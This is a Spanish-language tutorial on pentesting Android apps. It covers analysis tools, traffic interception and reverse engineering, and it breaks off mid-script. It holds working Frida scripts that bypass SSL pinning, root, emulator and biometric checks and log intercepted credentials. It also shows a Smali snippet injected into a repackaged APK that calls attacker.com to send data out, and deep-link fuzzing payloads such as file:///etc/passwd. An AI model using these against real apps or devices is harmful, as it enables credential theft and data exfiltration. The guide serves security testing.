# Pentesting de Aplicaciones Móviles Android - Guía Completa

## Contexto

Las aplicaciones móviles Android representan un vector de ataque importante en las pruebas de penetración. A diferencia del pentesting web tradicional, el análisis de aplicaciones móviles requiere un enfoque que combine análisis estático del código fuente con análisis dinámico en tiempo de ejecución.

---

## Tipos de Aplicaciones Móviles

### 1. Aplicaciones Nativas
- Vienen preinstaladas en el sistema operativo Android
- Desarrolladas específicamente para la plataforma
- Aprovechan todas las características del dispositivo móvil

### 2. Aplicaciones Web Móviles
- APK que simula un navegador
- En realidad son páginas web empaquetadas
- Se conectan al servidor principal de la organización
- No muestran URL visible al usuario

### 3. Aplicaciones Híbridas (Más comunes actualmente)
- Combinan tecnología nativa y web
- Creadas con frameworks específicos
- Desarrolladas con Android SDK usando Java
- Utilizan HTML, CSS y JavaScript
- Pueden desarrollarse con Eclipse

---

## Estructura de una APK

Cuando descargamos una aplicación desde Google Play Store, obtenemos un archivo APK (Android Package), que es un archivo comprimido que contiene:

### Archivos Principales
- **AndroidManifest.xml**: Archivo principal con todos los permisos de la aplicación
- **classes.dex**: Archivo Java bytecode compilado a bajo nivel
- **META-INF/**: Carpeta con metadatos y firmas digitales

### Archivos Adicionales (dependiendo de la aplicación)
- Carpetas JS (JavaScript)
- Resources (recursos)
- Assets (recursos estáticos)

---

## Herramientas de Análisis

### 1. Mobile Security Framework (MobSF)
- Framework de seguridad móvil
- Genera reportes automáticos
- Análisis estático y dinámico
- Instalación local requerida

**Instalación:**
```bash
# Clonar repositorio
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF

# Instalar dependencias
pip install -r requirements.txt

# Ejecutar MobSF
python manage.py runserver 127.0.0.1:8000
```

**Uso básico:**
1. Abrir navegador en `http://127.0.0.1:8000`
2. Subir archivo APK
3. Esperar análisis automático
4. Revisar reporte generado

### 2. Drozer
- Requiere cliente en dispositivo móvil y PC
- Funciona como cliente-servidor
- PC actúa como servidor
- Obtiene información de la aplicación en análisis

**Instalación:**
```bash
# En PC (servidor)
pip install drozer

# Descargar APK del agente para dispositivo
wget https://github.com/FSecureLABS/drozer/releases/download/2.4.4/drozer-agent-2.4.4.apk
adb install drozer-agent-2.4.4.apk
```

**Configuración:**
```bash
# En dispositivo: abrir Drozer Agent y habilitar servidor
# En PC: conectar con drozer
adb forward tcp:31415 tcp:31415
drozer console connect
```

### 3. Android Studio
- Framework estándar más utilizado
- Permite generar emuladores de diferentes versiones Android (7, 8, 9, 10)
- Evita necesidad de comprar múltiples dispositivos físicos
- Incluye emulación de diferentes tipos de dispositivos

**Configuración de emulador:**
```bash
# Crear AVD (Android Virtual Device)
android create avd -n test_device -t android-29
# o usar GUI: Tools > AVD Manager

# Ejecutar emulador
emulator -avd test_device
```

### 4. APKTool
**Instalación:**
```bash
# Linux/Mac
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
chmod +x apktool
sudo mv apktool /usr/local/bin/
```

**Uso:**
```bash
# Descompilar APK
apktool d app.apk -o app_decompiled

# Recompilar después de modificaciones
apktool b app_decompiled -o app_modified.apk

# Firmar APK modificada
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore app_modified.apk alias_name
```

### 5. Herramientas de Ingeniería Inversa y Hooking

#### Frida
**Instalación:**
```bash
# En PC
pip install frida-tools

# En dispositivo Android
# Descargar frida-server desde GitHub releases
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

#### JD-GUI (Java Decompiler)
```bash
# Descargar desde http://java-decompiler.github.io/
# Ejecutar con archivo classes.dex
java -jar jd-gui.jar
```

#### JADX (DEX to Java decompiler)
```bash
# Instalación
git clone https://github.com/skylot/jadx.git
cd jadx
./gradlew dist

# Uso
./bin/jadx -d output_folder app.apk
```

---

## Metodología de Análisis

### Análisis Estático vs Dinámico

#### Análisis Estático
- Aplicación desarmada/descomprimida
- Revisión del código fuente
- Análisis de clases y funciones
- Búsqueda de vulnerabilidades en el código

#### Análisis Dinámico (Recomendado)
- Aplicación en tiempo de ejecución
- Mejores resultados según estudios
- Visualización del tráfico de red
- Verificación de seguridad en transmisión de datos
- Obtención de datos reales de funcionamiento

---

## Proceso de Pentesting Paso a Paso

### Paso 1: Preparación del Entorno

**Configuración inicial:**
```bash
# Verificar ADB instalado
adb version

# Habilitar opciones de desarrollador en dispositivo
# Configuraciones > Acerca del teléfono > Tocar 7 veces en "Número de compilación"

# Habilitar depuración USB
# Configuraciones > Opciones de desarrollador > Depuración USB

# Conectar dispositivo y verificar
adb devices
```

**Preparar directorio de trabajo:**
```bash
mkdir mobile_pentest
cd mobile_pentest
mkdir apks tools reports extracted
```

### Paso 2: Obtención y Descompresión de la APK

**Método 1: Extracción desde dispositivo**
```bash
# Listar aplicaciones instaladas
adb shell pm list packages | grep -i "nombre_app"

# Obtener ruta de la APK
adb shell pm path com.package.name

# Extraer APK del dispositivo
adb pull /data/app/com.package.name/base.apk ./apks/
```

**Método 2: Descarga directa**
```bash
# Cambiar extensión y descomprimir
cp app.apk app.zip
unzip app.zip -d extracted/app_manual/

# Verificar estructura
ls -la extracted/app_manual/
```

**Método 3: Usando APKTool (Recomendado)**
```bash
# Descompilar con recursos legibles
apktool d app.apk -o extracted/app_apktool/

# Verificar archivos extraídos
find extracted/app_apktool/ -name "*.xml" | head -10
find extracted/app_apktool/ -name "*.smali" | head -10
```

### Paso 3: Análisis de Manifiesto

**Analizar AndroidManifest.xml:**
```bash
# Ver permisos de forma limpia
grep -n "uses-permission" extracted/app_apktool/AndroidManifest.xml

# Buscar permisos críticos
grep -E "(CAMERA|RECORD_AUDIO|READ_CONTACTS|ACCESS_FINE_LOCATION|WRITE_EXTERNAL_STORAGE)" extracted/app_apktool/AndroidManifest.xml

# Analizar componentes exportados (vulnerables)
grep -A 5 -B 5 'android:exported="true"' extracted/app_apktool/AndroidManifest.xml

# Buscar intent-filters (puntos de entrada)
grep -A 10 "intent-filter" extracted/app_apktool/AndroidManifest.xml
```

**Script Python para análisis automático de permisos:**
```python
import xml.etree.ElementTree as ET

def analyze_permissions(manifest_path):
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    
    dangerous_permissions = [
        'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'WRITE_CONTACTS',
        'ACCESS_FINE_LOCATION', 'READ_SMS', 'SEND_SMS', 'CALL_PHONE',
        'READ_PHONE_STATE', 'WRITE_EXTERNAL_STORAGE'
    ]
    
    permissions = []
    for permission in root.findall('./uses-permission'):
        perm_name = permission.get('{http://schemas.android.com/apk/res/android}name')
        permissions.append(perm_name)
        
        # Verificar permisos peligrosos
        for danger in dangerous_permissions:
            if danger in perm_name:
                print(f"[!] PERMISO CRÍTICO: {perm_name}")
    
    return permissions

# Uso
permissions = analyze_permissions('extracted/app_apktool/AndroidManifest.xml')
```

### Paso 4: Ingeniería Inversa del Código

**Usando JADX (Recomendado):**
```bash
# Descompilar APK completa
jadx -d extracted/jadx_output/ app.apk

# Buscar strings interesantes
grep -r -i "password\|token\|api\|key\|secret" extracted/jadx_output/

# Buscar URLs y endpoints
grep -r -E "https?://[^\s]+" extracted/jadx_output/

# Buscar funciones de cifrado
grep -r -i "encrypt\|decrypt\|cipher\|aes\|rsa" extracted/jadx_output/
```

**Análisis de código Smali:**
```bash
# Buscar en código Smali (si APKTool fue usado)
grep -r "invoke-virtual.*encrypt" extracted/app_apktool/smali/

# Buscar hardcoded credentials
grep -r -E "(password|pwd|token|key).*=" extracted/app_apktool/smali/

# Buscar llamadas de red
grep -r "HttpURLConnection\|OkHttp\|Retrofit" extracted/app_apktool/smali/
```

### Paso 5: Configuración del Entorno de Análisis Dinámico

**Configuración de Android Studio y Emulador:**
```bash
# Crear AVD con Google APIs (para proxy)
android create avd -n pentest_device -t "Google Inc.:Google APIs:29"

# Ejecutar emulador con proxy habilitado
emulator -avd pentest_device -http-proxy 127.0.0.1:8080

# Verificar emulador funcionando
adb devices
```

**Configurar proxy system-wide en emulador:**
```bash
# Acceder a configuración de proxy
adb shell settings put global http_proxy 127.0.0.1:8080

# Verificar configuración
adb shell settings get global http_proxy
```

### Paso 6: Instalación y Configuración de Burp Suite

**Configuración de certificado:**
```bash
# 1. Exportar certificado CA de Burp Suite
# Proxy > Options > Import/Export CA Certificate > Export > Certificate in DER format

# 2. Convertir a formato compatible con Android
openssl x509 -inform DER -in cacert.der -out cacert.pem

# 3. Renombrar con hash correcto
openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
mv cacert.pem <hash>.0

# 4. Instalar en emulador (requiere root)
adb root
adb remount
adb push <hash>.0 /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/<hash>.0"
adb reboot
```

**Configuración de proxy en Android (método alternativo):**
```bash
# WiFi Settings > Long press on network > Modify network
# Advanced options > Proxy > Manual
# Proxy hostname: IP de la máquina con Burp Suite
# Proxy port: 8080
```

### Paso 7: Análisis de Logs en Tiempo Real

**Monitoreo básico:**
```bash
# Logs generales de la aplicación
adb logcat | grep "com.target.app"

# Filtrar por nivel de log
adb logcat *:E | grep "target_app"  # Solo errores
adb logcat *:W | grep "target_app"  # Warnings y errores
adb logcat *:I | grep "target_app"  # Info, warnings y errores

# Logs de red específicos
adb logcat | grep -E "(http|https|tcp|ssl)"

# Guardar logs en archivo
adb logcat | grep "target_app" > logs/app_analysis.log
```

**Script avanzado de monitoreo:**
```bash
#!/bin/bash
# monitor_app.sh

APP_PACKAGE=$1
LOG_FILE="logs/${APP_PACKAGE}_$(date +%Y%m%d_%H%M%S).log"

echo "[+] Monitoreando aplicación: $APP_PACKAGE"
echo "[+] Guardando en: $LOG_FILE"

# Limpiar buffer de logs
adb logcat -c

# Iniciar monitoreo
adb logcat | grep "$APP_PACKAGE" | tee "$LOG_FILE"
```

### Paso 8: Análisis del Sistema de Archivos

**Exploración de directorios de aplicación:**
```bash
# Acceder al directorio de la aplicación (requiere root)
adb shell
su
cd /data/data/com.target.app/

# Listar estructura completa
find . -type f -exec ls -la {} \; | tee filesystem_analysis.txt

# Buscar archivos de configuración
find . -name "*.xml" -o -name "*.json" -o -name "*.conf"

# Buscar bases de datos
find . -name "*.db" -o -name "*.sqlite" -o -name "*.db3"

# Buscar archivos de logs
find . -name "*.log" -o -name "*.txt" | xargs cat

# Verificar permisos de archivos críticos
ls -la databases/
ls -la shared_prefs/
```

**Extracción automatizada:**
```bash
#!/bin/bash
# extract_app_data.sh

PACKAGE_NAME=$1
OUTPUT_DIR="extracted_data/$PACKAGE_NAME"

mkdir -p "$OUTPUT_DIR"

echo "[+] Extrayendo datos de $PACKAGE_NAME"

# Extraer todo el directorio de la aplicación
adb pull /data/data/$PACKAGE_NAME/ "$OUTPUT_DIR/"

# Extraer APK
adb shell pm path $PACKAGE_NAME | cut -d: -f2 | xargs adb pull
mv base.apk "$OUTPUT_DIR/original.apk"

echo "[+] Extracción completa en $OUTPUT_DIR"
```

### Paso 9: Análisis de Bases de Datos

**Extracción y análisis de SQLite:**
```bash
# Extraer bases de datos específicas
adb pull /data/data/com.target.app/databases/ ./databases/

# Analizar con sqlite3
sqlite3 databases/database.db

# Comandos SQLite útiles
.tables                          # Listar tablas
.schema table_name              # Ver estructura de tabla
SELECT * FROM table_name;       # Ver contenido
.dump                          # Dump completo de la DB

# Buscar datos sensibles
.headers on
SELECT * FROM users WHERE password IS NOT NULL;
SELECT * FROM sessions WHERE token LIKE '%key%';
```

**Script para análisis automático de DBs:**
```python
import sqlite3
import os
import glob

def analyze_databases(db_path):
    """Analiza todas las bases de datos SQLite encontradas"""
    db_files = glob.glob(f"{db_path}/*.db")
    
    for db_file in db_files:
        print(f"\n[+] Analizando: {db_file}")
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            
            # Listar tablas
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            
            for table in tables:
                table_name = table[0]
                print(f"  - Tabla: {table_name}")
                
                # Buscar columnas sensibles
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = cursor.fetchall()
                
                sensitive_columns = ['password', 'token', 'key', 'secret', 'pin']
                for col in columns:
                    col_name = col[1].lower()
                    if any(sens in col_name for sens in sensitive_columns):
                        print(f"    [!] Columna sensible: {col[1]}")
                        
            conn.close()
        except Exception as e:
            print(f"  [-] Error: {e}")

# Uso
analyze_databases("./databases/")
```

### Paso 10: Análisis de Tráfico de Red

**Configuración avanzada de Burp Suite:**
```bash
# Configurar Burp Suite para móviles
# 1. Proxy > Options > Proxy Listeners
# 2. Add > Bind to address: All interfaces
# 3. Port: 8080

# 4. Import CA certificate en Android
# Configuraciones > Seguridad > Certificados de confianza > Instalar desde almacenamiento
```

**Interceptar tráfico HTTPS:**
```bash
# 1. Configurar proxy en WiFi del dispositivo
# 2. Visitar http://burp en navegador del dispositivo
# 3. Descargar e instalar certificado CA

# 4. Para aplicaciones con certificate pinning, usar Frida:
frida -U -f com.target.app -l ssl_bypass.js --no-pause
```

**Script SSL Bypass para Frida:**
```javascript
// ssl_bypass.js
Java.perform(function() {
    console.log("[+] SSL Bypass iniciado");
    
    // Bypass para OkHttp
    try {
        var OkHttpClient = Java.use("okhttp3.OkHttpClient");
        OkHttpClient.certificatePinner.implementation = function() {
            console.log("[+] OkHttp Certificate Pinning bypassed");
            return null;
        };
    } catch(e) {}
    
    // Bypass para Apache HTTP
    try {
        var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
        HttpsURLConnection.setDefaultHostnameVerifier.implementation = function(hostnameVerifier) {
            console.log("[+] HttpsURLConnection Hostname Verifier bypassed");
            return null;
        };
    } catch(e) {}
    
    // Bypass genérico de TrustManager
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    
    TrustManager.checkServerTrusted.implementation = function(chain, authType) {
        console.log("[+] TrustManager bypassed");
        return;
    };
});
```

### Paso 11: Análisis de Root/Emulator Detection

**Detectar mecanismos de protección:**
```bash
# Buscar funciones de detección en código
grep -r -i "root\|emulator\|debug" extracted/jadx_output/

# Strings comunes de detección
strings app.apk | grep -i -E "(root|su|busybox|emulator|goldfish|test-keys)"

# Verificar propiedades del sistema que revisan
grep -r "ro.build\|ro.product\|ro.hardware" extracted/jadx_output/
```

**Script Frida para bypass de detección de root:**
```javascript
// root_bypass.js
Java.perform(function() {
    console.log("[+] Root Detection Bypass iniciado");
    
    // Bypass común de RootBeer library
    try {
        var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
        RootBeer.isRooted.implementation = function() {
            console.log("[+] RootBeer.isRooted() bypassed");
            return false;
        };
    } catch(e) {}
    
    // Bypass detección de archivos SU
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var file_path = this.getAbsolutePath();
        if (file_path.indexOf("su") !== -1 || 
            file_path.indexOf("busybox") !== -1 || 
            file_path.indexOf("Superuser") !== -1) {
            console.log("[+] File.exists() bypassed for: " + file_path);
            return false;
        }
        return this.exists();
    };
    
    // Bypass System.getProperty
    var System = Java.use("java.lang.System");
    System.getProperty.overload('java.lang.String').implementation = function(property) {
        if (property === "ro.build.tags") {
            console.log("[+] System.getProperty(ro.build.tags) bypassed");
            return "release-keys";
        }
        return this.getProperty(property);
    };
});
```

### Paso 12: Análisis de Shared Preferences

**Extracción y análisis:**
```bash
# Extraer preferencias compartidas
adb pull /data/data/com.target.app/shared_prefs/ ./shared_prefs/

# Analizar archivos XML de preferencias
for file in shared_prefs/*.xml; do
    echo "=== Analizando $file ==="
    cat "$file" | xmllint --format -
    echo
done

# Buscar información sensible
grep -r -i -E "(password|token|key|secret|pin|credit|card)" shared_prefs/
```

### Paso 13: Memory Dumping y Análisis

**Dump de memoria de la aplicación:**
```bash
# Obtener PID de la aplicación
adb shell ps | grep com.target.app

# Crear dump de memoria (requiere root)
adb shell "su -c 'dd if=/proc/PID/mem of=/sdcard/memdump.bin'"
adb pull /sdcard/memdump.bin ./

# Analizar dump con strings
strings memdump.bin | grep -E "(http|password|token|key)"

# Buscar patrones específicos
hexdump -C memdump.bin | grep -A 5 -B 5 "password"
```

### Paso 14: Análisis de Comunicación IPC

**Análisis de Intent vulnerable:**
```bash
# Buscar intents exportados
grep -r "exported.*true" extracted/app_apktool/

# Probar envío de intents maliciosos
adb shell am start -n com.target.app/.VulnerableActivity \
    --es "extra_param" "malicious_payload"

# Probar broadcast intents
adb shell am broadcast -a com.target.app.ACTION \
    --es "sensitive_data" "test_payload"
```

### Paso 15: Testing de Deep Links

**Identificar y probar deep links:**
```bash
# Buscar esquemas de URL personalizados
grep -r -A 5 -B 5 "android:scheme" extracted/app_apktool/

# Probar deep links encontrados
adb shell am start \
    -W -a android.intent.action.VIEW \
    -d "customscheme://host/path?param=value" \
    com.target.app
```

### Paso 16: Análisis de Librerías de Terceros

**Identificar librerías:**
```bash
# Listar librerías nativas
unzip -l app.apk | grep "\.so$"

# Extraer y analizar librerías nativas
mkdir native_libs
unzip app.apk "lib/*" -d native_libs/

# Analizar símbolos en librerías
for lib in native_libs/lib/*/*.so; do
    echo "=== $lib ==="
    readelf -s "$lib" | grep -E "(password|encrypt|decrypt|key)"
    strings "$lib" | grep -E "(http|ftp|api\.)"
done
```

### Paso 17: Bypass de Protecciones con Frida

**Script completo de bypass:**
```javascript
// complete_bypass.js
Java.perform(function() {
    console.log("[+] Iniciando bypass completo");
    
    // 1. Bypass Root Detection
    var RootPackages = ["com.noshufou.android.su", "com.thirdparty.superuser",
                       "eu.chainfire.supersu", "com.koushikdutta.superuser"];
    
    var PackageManager = Java.use("android.app.ApplicationPackageManager");
    PackageManager.getInstalledApplications.implementation = function(flags) {
        var apps = this.getInstalledApplications(flags);
        var filteredApps = [];
        for (var i = 0; i < apps.size(); i++) {
            var app = apps.get(i);
            if (RootPackages.indexOf(app.packageName.value) === -1) {
                filteredApps.push(app);
            }
        }
        return filteredApps;
    };
    
    // 2. Bypass Emulator Detection
    var Build = Java.use("android.os.Build");
    Build.HARDWARE.value = "qcom";
    Build.PRODUCT.value = "real_device";
    Build.MANUFACTURER.value = "samsung";
    Build.BRAND.value = "samsung";
    Build.MODEL.value = "SM-G950F";
    
    // 3. Bypass Debug Detection
    var Debug = Java.use("android.os.Debug");
    Debug.isDebuggerConnected.implementation = function() {
        console.log("[+] Debug.isDebuggerConnected() bypassed");
        return false;
    };
    
    // 4. Bypass SSL Pinning
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    HttpsURLConnection.setDefaultHostnameVerifier.implementation = function(hostnameVerifier) {
        console.log("[+] SSL Hostname Verifier bypassed");
        return null;
    };
    
    console.log("[+] Bypass completo activado");
});
```

### Paso 18: Automatización del Proceso

**Script master de análisis:**
```bash
#!/bin/bash
# mobile_pentest.sh

APP_PATH=$1
PACKAGE_NAME=$2

if [ $# -ne 2 ]; then
    echo "Uso: $0 <path_to_apk> <package_name>"
    exit 1
fi

echo "[+] Iniciando análisis de $APP_PATH"

# 1. Crear estructura de directorios
mkdir -p analysis/$PACKAGE_NAME/{static,dynamic,reports,tools}
cd analysis/$PACKAGE_NAME

# 2. Análisis estático
echo "[+] Ejecutando análisis estático..."
apktool d ../../$APP_PATH -o static/apktool_output
jadx -d static/jadx_output ../../$APP_PATH

# 3. Extraer información básica
echo "[+] Extrayendo información básica..."
aapt dump badging ../../$APP_PATH > reports/basic_info.txt
aapt dump permissions ../../$APP_PATH > reports/permissions.txt

# 4. Buscar strings sensibles
echo "[+] Buscando strings sensibles..."
grep -r -i -E "(password|token|api|key|secret|http)" static/jadx_output/ > reports/sensitive_strings.txt

# 5. Instalar aplicación en emulador
echo "[+] Instalando aplicación..."
adb install ../../$APP_PATH

# 6. Preparar Frida
echo "[+] Preparando scripts de Frida..."
cp ../../../tools/complete_bypass.js dynamic/

echo "[+] Análisis preparado. Ejecutar monitoreo dinámico manualmente."
```

### Paso 19: Análisis de WebViews

**Detectar WebViews vulnerables:**
```bash
# Buscar uso de WebView en código
grep -r "WebView\|loadUrl\|addJavascriptInterface" extracted/jadx_output/

# Verificar configuraciones inseguras
grep -r "setJavaScriptEnabled\|setAllowFileAccess" extracted/jadx_output/
```

**Script Frida para WebView debugging:**
```javascript
// webview_analysis.js
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    var WebViewClient = Java.use("android.webkit.WebViewClient");
    
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log("[+] WebView loading URL: " + url);
        return this.loadUrl(url);
    };
    
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log("[+] JavaScript Interface added: " + name);
        return this.addJavascriptInterface(obj, name);
    };
    
    WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
        console.log("[+] SSL Error intercepted: " + error.toString());
        handler.proceed(); // Proceder ignorando error SSL
    };
});
```

### Paso 20: Reportes y Documentación

**Generar reporte final:**
```bash
#!/bin/bash
# generate_report.sh

PACKAGE_NAME=$1
REPORT_DIR="reports"

cat > $REPORT_DIR/final_report.md << EOF
# Reporte de Pentesting - $PACKAGE_NAME

## Resumen Ejecutivo
- **Aplicación:** $PACKAGE_NAME
- **Fecha de análisis:** $(date)
- **Metodología:** OWASP MSTG

## Vulnerabilidades Encontradas

### Críticas
$(grep -c "CRITICAL" $REPORT_DIR/vulnerabilities.txt) vulnerabilidades críticas

### Altas
$(grep -c "HIGH" $REPORT_DIR/vulnerabilities.txt) vulnerabilidades altas

### Medias
$(grep -c "MEDIUM" $REPORT_DIR/vulnerabilities.txt) vulnerabilidades medias

## Recomendaciones
1. Implementar certificate pinning
2. Proteger contra root detection bypass
3. Cifrar datos sensibles en almacenamiento local
4. Validar todas las entradas de usuario

## Evidencias
Ver archivos adjuntos en directorio de análisis.
EOF

echo "[+] Reporte generado en $REPORT_DIR/final_report.md"
```

---

## Técnicas Avanzadas de Análisis

### Hooking Dinámico con Frida

**Interceptar funciones de autenticación:**
```javascript
// auth_bypass.js
Java.perform(function() {
    console.log("[+] Hooking funciones de autenticación");
    
    // Hook función de login
    var LoginClass = Java.use("com.target.app.LoginActivity");
    LoginClass.validateCredentials.implementation = function(username, password) {
        console.log("[+] Credenciales interceptadas:");
        console.log("    Username: " + username);
        console.log("    Password: " + password);
        
        // Llamar función original
        var result = this.validateCredentials(username, password);
        console.log("    Resultado: " + result);
        return result;
    };
    
    // Hook SharedPreferences para ver datos guardados
    var SharedPrefsImpl = Java.use("android.app.SharedPreferencesImpl");
    SharedPrefsImpl.getString.implementation = function(key, defValue) {
        var value = this.getString(key, defValue);
        if (key.toLowerCase().indexOf("token") !== -1 || 
            key.toLowerCase().indexOf("password") !== -1) {
            console.log("[+] SharedPrefs - " + key + ": " + value);
        }
        return value;
    };
});
```

**Monitoreo de llamadas de red:**
```javascript
// network_monitor.js
Java.perform(function() {
    console.log("[+] Monitoreando tráfico de red");
    
    // Hook OkHttp requests
    var Request = Java.use("okhttp3.Request");
    var RequestBuilder = Java.use("okhttp3.Request$Builder");
    
    RequestBuilder.build.implementation = function() {
        var request = this.build();
        console.log("[+] HTTP Request: " + request.url().toString());
        
        // Mostrar headers
        var headers = request.headers();
        var headerNames = headers.names();
        var iterator = headerNames.iterator();
        
        while (iterator.hasNext()) {
            var name = iterator.next();
            console.log("    Header: " + name + " = " + headers.get(name));
        }
        
        return request;
    };
    
    // Hook Response para ver respuestas
    var Response = Java.use("okhttp3.Response");
    var ResponseBody = Java.use("okhttp3.ResponseBody");
    
    ResponseBody.string.implementation = function() {
        var content = this.string();
        console.log("[+] Response Body: " + content.substring(0, 200) + "...");
        return content;
    };
});
```

### Análisis de Cryptografía

**Detectar implementaciones criptográficas:**
```bash
# Buscar algoritmos de cifrado
grep -r -i -E "(AES|DES|RSA|MD5|SHA|HMAC)" extracted/jadx_output/

# Buscar llaves hardcodeadas
grep -r -E "(['\"])[A-Za-z0-9+/]{32,}=*\1" extracted/jadx_output/

# Buscar funciones de KeyStore
grep -r "KeyStore\|SecretKey\|PrivateKey" extracted/jadx_output/
```

**Script para interceptar operaciones criptográficas:**
```javascript
// crypto_monitor.js
Java.perform(function() {
    console.log("[+] Monitoreando operaciones criptográficas");
    
    // Hook Cipher operations
    var Cipher = Java.use("javax.crypto.Cipher");
    
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log("[+] Cipher.doFinal called");
        console.log("    Algorithm: " + this.getAlgorithm());
        console.log("    Input: " + Java.use("java.lang.String").$new(input));
        
        var result = this.doFinal(input);
        console.log("    Output: " + Java.use("java.lang.String").$new(result));
        return result;
    };
    
    // Hook KeyGenerator
    var KeyGenerator = Java.use("javax.crypto.KeyGenerator");
    KeyGenerator.generateKey.implementation = function() {
        console.log("[+] KeyGenerator.generateKey called");
        console.log("    Algorithm: " + this.getAlgorithm());
        return this.generateKey();
    };
});
```

### Manipulación de APK y Repackaging

**Proceso completo de modificación:**
```bash
# 1. Descompilar APK original
apktool d original.apk -o modified_app

# 2. Realizar modificaciones necesarias
# Editar archivos .smali o recursos

# 3. Recompilar APK
apktool b modified_app -o modified.apk

# 4. Alinear APK
zipalign -v 4 modified.apk aligned.apk

# 5. Generar keystore para firma
keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass android -keypass android

# 6. Firmar APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
          -keystore debug.keystore aligned.apk androiddebugkey

# 7. Instalar APK modificada
adb install aligned.apk
```

**Inyección de payload en APK:**
```smali
# Ejemplo de código Smali para inyectar
# En archivo MainActivity.smali, método onCreate:

.line 25
const-string v0, "INJECTED"
const-string v1, "Payload ejecutado exitosamente"
invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

# Agregar envío de datos a servidor externo
.line 26
new-instance v2, Ljava/net/URL;
const-string v3, "http://attacker.com/collect"
invoke-direct {v2, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
```

---

## Análisis Forense de Dispositivos

### Extracción Completa del Dispositivo

**Usando dd (requiere root):**
```bash
# Identificar particiones
adb shell cat /proc/partitions

# Crear imagen completa
adb shell "su -c 'dd if=/dev/block/mmcblk0 of=/sdcard/full_dump.img'"
adb pull /sdcard/full_dump.img ./

# Analizar imagen con herramientas forenses
file full_dump.img
hexdump -C full_dump.img | head -50
```

**Extracción de datos de aplicación específica:**
```bash
# Backup completo de aplicación
adb backup -apk -shared -system com.target.app -f backup.ab

# Convertir backup a TAR
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar -tf backup.tar | head -20
```

### Análisis de Memoria RAM

**Dump de memoria específica:**
```bash
# Obtener información de memoria de proceso
adb shell "su -c 'cat /proc/PID/maps'" > memory_maps.txt

# Extraer segmentos específicos
adb shell "su -c 'dd if=/proc/PID/mem of=/sdcard/heap_dump.bin skip=START_ADDR count=SIZE'"
```

**Análisis de dumps de memoria:**
```python
# memory_analyzer.py
import re
import mmap

def search_patterns_in_memory(dump_file):
    patterns = {
        'URLs': rb'https?://[^\s<>"{}|\\^`\[\]]+',
        'API_Keys': rb'[A-Za-z0-9]{32,}',
        'JSON': rb'\{[^{}]*"[^"]*"[^{}]*\}',
        'Passwords': rb'password["\s]*[:=]["\s]*[^"\s]+',
        'Tokens': rb'token["\s]*[:=]["\s]*[^"\s]+'
    }
    
    findings = {}
    
    with open(dump_file, 'rb') as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, mm, re.IGNORECASE)
                findings[pattern_name] = [match.decode('utf-8', errors='ignore') 
                                        for match in matches[:10]]  # Limitar resultados
    
    return findings

# Uso
findings = search_patterns_in_memory('heap_dump.bin')
for category, matches in findings.items():
    print(f"\n[+] {category}:")
    for match in matches:
        print(f"    {match}")
```

---

## Testing de Casos Específicos

### 1. Bypass de Autenticación Biométrica

**Script Frida para bypass:**
```javascript
// biometric_bypass.js
Java.perform(function() {
    console.log("[+] Bypassing biometric authentication");
    
    // Hook BiometricPrompt
    var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
    BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded.implementation = function(result) {
        console.log("[+] Biometric authentication bypassed");
        this.onAuthenticationSucceeded(result);
    };
    
    // Hook FingerprintManager (API anterior)
    try {
        var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
        FingerprintManager.AuthenticationCallback.onAuthenticationSucceeded.implementation = function(result) {
            console.log("[+] Fingerprint authentication bypassed");
            this.onAuthenticationSucceeded(result);
        };
    } catch(e) {}
});
```

### 2. Testing de Deep Links y URL Schemes

**Fuzzing de deep links:**
```bash
#!/bin/bash
# deeplink_fuzzer.sh

PACKAGE=$1
SCHEME=$2

payloads=(
    "javascript:alert(1)"
    "file:///etc/passwd"
    "../../../sensitive_file"
    "http://evil.com/redirect"
    "content://com.android.providers.downloads.documents/document/raw%3A%2Fdata%2Fdata%2Fcom.target.app%2F"
)

for payload in "${payloads[@]}"; do
    echo "[+] Testing payload: $payload"
    adb shell am start -W -a android.intent.action.VIEW -d "$SCHEME://$payload" $PACKAGE
    sleep 2
    
    # Verificar logs para errores
    adb logcat -d | tail -20 | grep -i error
done
```

### 3. Análisis de Proveedores de Contenido

**Enumerar Content Providers:**
```bash
# Extraer proveedores del manifiesto
grep -A 10 -B 2 "provider" extracted/app_apktool/AndroidManifest.xml

# Script para testing automático
#!/bin/bash
# content_provider_test.sh

PACKAGE=$1

# Obtener información de proveedores
